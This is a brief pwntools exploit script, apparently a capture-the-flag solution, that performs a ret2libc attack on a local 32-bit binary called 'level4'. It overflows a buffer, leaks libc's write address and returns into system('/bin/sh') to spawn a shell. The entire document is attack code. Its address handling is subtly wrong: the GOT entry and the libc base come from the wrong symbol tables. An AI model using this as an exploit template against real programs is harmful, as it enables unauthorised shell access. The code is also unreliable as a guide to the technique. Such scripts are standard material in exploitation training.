from pwn import *
context(log_level='debug')
io = process("./level4")
elf = ELF("./level4")
libc = ELF("./libc-2.23.so")
write_plt = elf.sym['write']
write_got = elf.sym['write']
main_addr = elf.sym['main']
payload = 'a'*(0x88+4)+ p32(write_plt) + p32(main_addr) + p32(1)+p32(write_got) + p32(4)
io.sendline(payload)
write_add = u32(io.recv(4))

print write_add

base = write_add - write_got
sys_add = base + libc.sym['system']
bin_sh = base + libc.search('/bin/sh').next()

payload = 'a'*(0x88+4) + p32(sys_add)+ p32(main_addr)+ p32(bin_sh)

io.sendline(payload)
io.interactive()